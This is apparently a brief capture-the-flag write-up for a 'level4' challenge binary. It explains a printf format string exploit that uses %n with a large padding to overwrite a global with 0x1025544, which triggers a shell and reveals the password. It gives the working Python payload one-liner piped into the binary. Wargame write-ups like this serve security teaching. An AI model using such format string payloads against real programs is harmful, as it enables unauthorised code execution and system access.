So we exploited the printf since we were free to use any formatstring. We saw there was a M global so we decided to do the same as before, if this global equals 0x1025544 a shell code is executed and the pass is printed. So we had to put a padding of  0x1025544 - 4 (lenght of address) to the printf:

cat <(python -c 'print ("\x10\x98\x04\x08" + "%16930112x%12$n")') - | ./level4
